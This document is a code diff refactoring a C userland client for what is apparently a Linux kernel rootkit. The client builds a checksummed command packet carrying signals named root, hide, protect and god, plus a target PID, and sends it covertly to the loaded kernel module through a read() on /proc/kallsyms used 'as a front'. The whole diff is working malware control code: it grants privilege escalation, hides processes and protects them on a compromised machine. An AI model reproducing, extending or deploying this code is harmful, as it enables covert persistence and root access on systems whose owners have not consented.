@@ -5,16 +5,25 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/types.h>
 #include <time.h>
 #include <unistd.h>
-#include <sys/types.h>
-
+#include <stdbool.h>
 typedef enum {
   SIG_GOD = 0xFF,
   SIG_HIDE = 0xFA,
   SIG_PROTECT = 0xFB,
   SIG_ROOT = 0xBA,
 } CmdSignal;
+
+typedef enum {
+    CMD_SIZE = sizeof(char),
+    RAND_BYTES_SIZE = 4 * sizeof(char),
+    CRC_SIZE = sizeof(uint32_t),
+    PID_OFFSET = CMD_SIZE + RAND_BYTES_SIZE,
+    PID_SIZE = sizeof(pid_t),
+    TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE
+} SIZE_REF;
 
 const uint32_t crc32_tab[] = {
     0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
@@ -68,13 +77,13 @@ const uint32_t crc32_tab[] = {
  * in sys/libkern.h, where it can be inlined.
  */
 uint32_t crc32(const void *buf, size_t size) {
-    const uint8_t *p = buf;
-    uint32_t crc;
+  const uint8_t *p = buf;
+  uint32_t crc;
 
-    crc = ~0U;
-    while (size--)
-        crc = crc32_tab[(crc ^ *p++) & 0xFF] ^ (crc >> 8);
-    return crc ^ ~0U;
+  crc = ~0U;
+  while (size--)
+    crc = crc32_tab[(crc ^ *p++) & 0xFF] ^ (crc >> 8);
+  return crc ^ ~0U;
 }
 
 void append_rand_bytes(char *buffer, size_t size) {
@@ -83,82 +92,100 @@ void append_rand_bytes(char *buffer, size_t size) {
   }
 }
 
-void append_crc(char *buffer, size_t size) {
-  uint32_t crc = htole32(crc32(buffer, size));
-  memcpy(buffer + size, &crc, sizeof(crc));
+void append_pid(char *buffer, pid_t pid, size_t offset) {
+  pid_t pid_le = htole32(pid); // change endianess to le
+  memcpy(buffer + offset, &pid_le, PID_SIZE);
 }
 
-void append_pid(char *buffer, pid_t pid, size_t offset) {
-  pid_t pid_le = htole32(pid);
-  memcpy(buffer + offset, &pid_le, sizeof(pid_t));
+void append_crc(char *buffer, size_t size) {
+  uint32_t crc = htole32(crc32(buffer, size)); // change endianess to le
+  memcpy(buffer + size, &crc, CRC_SIZE);
 }
 
 void print_buf(const char buffer[], size_t size) {
-  printf("=> Constructed command: ");
+  printf("=> Command: ");
   for (size_t i = 0; i < size; i++) {
     printf("%02X", (unsigned char)buffer[i]);
   }
   printf("\n");
 }
 
+// Translate cmd using CmdSignal enum and store the value to *ptr
+void get_cmd(const char *cmd, uint8_t *ptr) {
+    if (strncmp(cmd, "root", strlen("root")) == 0) {
+      *ptr = SIG_ROOT;
+    } else if (strncmp(cmd, "god", strlen("god")) == 0) {
+      *ptr = SIG_GOD;
+    } else if (strncmp(cmd, "protect", strlen("protect")) == 0) {
+      *ptr = SIG_PROTECT;
+    } else if (strncmp(cmd, "hide", strlen("hide")) == 0) {
+      *ptr = SIG_HIDE;
+    } else {
+        fprintf(stderr, "%s is not a valid command", cmd);
+    }
+}
+
+// Translate pid to a number and store the value to *ptr. Returns false if translation fails
+bool get_pid(char **argv, pid_t *ptr) {
+  if (argv[2]) {
+    *ptr = (pid_t)(htole32(strtol(argv[2], NULL, 10)));
+    if (errno == ERANGE) {
+      fprintf(stderr, "Invalid PID value: %s\n", argv[2]);
+      return false;
+    }
+  } else {
+    *ptr = (pid_t)0;
+  }
+  return true;
+}
+
+// Piece all the data together to construct the final buffer
+void finalize_buffer(
+    char buf[1024], 
+    const uint8_t cmd,  
+    const pid_t pid
+)
+{
+    buf[0] = cmd;
+    append_rand_bytes(buf + 1, RAND_BYTES_SIZE);
+    append_pid(buf, pid, PID_OFFSET);
+    append_crc(buf, TOTAL_SIZE - CRC_SIZE);
+}
+
 int main(int argc, char *argv[]) {
-  if (argc < 3) {
-    fprintf(stderr, "Usage: %s <CMD> <PID>\n", argv[0]);
+  if (argc < 2) {
+    fprintf(stderr, "Usage: %s <cmd> [pid]\n", argv[0]);
     return 1;
   }
 
-  size_t rand_bytes_size = 4; // Number of random bytes
-  size_t pid_size = sizeof(pid_t);
-  size_t crc_size = sizeof(uint32_t);
-
-  // Total size: 1 (cmd) + 4 (random bytes) + sizeof(pid_t) + sizeof(uint32_t)
-  // (CRC)
-  size_t data_size = 1 + rand_bytes_size + pid_size + crc_size;
-  ssize_t error;
-
-  uint32_t crc;
   uint8_t cmd;
-  int fd;
   pid_t pid;
+
+  ssize_t error;
+  int fd;
 
   char buffer[1024] = {0};
   size_t buf_size = sizeof(buffer);
 
   srand(time(NULL));
-  printf("-> Seeded PRNG\n");
 
   // Parse command and PID arguments
-  cmd = (uint8_t)strtol(argv[1], NULL, 16);
-  if (errno == ERANGE) {
-    fprintf(stderr, "Invalid CMD value: %s\n", argv[1]);
+  get_cmd(argv[1], &cmd);
+  if (!get_pid(argv, &pid)) { // 
     return 1;
-  }
-
-  pid = (pid_t)strtol(argv[2], NULL, 10);
-  if (errno == ERANGE) {
-    fprintf(stderr, "Invalid PID value: %s\n", argv[2]);
-    return 1;
-  }
+  };
 
   // Construct buffer
-  buffer[0] = cmd;                                // initial byte (cmd)
-  append_rand_bytes(buffer + 1, rand_bytes_size); // append 4 random bytes
+  finalize_buffer(buffer, cmd, pid);
 
-  // Calculate position to insert PID
-  size_t pid_offset = 1 + rand_bytes_size;
-  append_pid(buffer, pid, pid_offset);
-
-  // Calculate CRC for the part of buffer before the CRC
-  append_crc(buffer, pid_offset + pid_size);
-
-  print_buf(buffer, data_size);
+  print_buf(buffer, TOTAL_SIZE);
 
   fd = open("/proc/kallsyms", O_RDONLY);
   if (fd < 0) {
     fprintf(stderr, "Error opening file: %s\n", strerror(errno));
     return 1;
   }
-  printf("-> Opened fd to /proc/kallsyms\n");
+  printf("-> Opened fd to target\n");
 
   // Send command to the kernel using a read() as a front
   error = read(fd, buffer, buf_size);
@@ -167,6 +194,7 @@ int main(int argc, char *argv[]) {
     close(fd);
     return 1;
   }
+  printf("=> Sent command to LKM\n");
 
   close(fd);
   return 0;
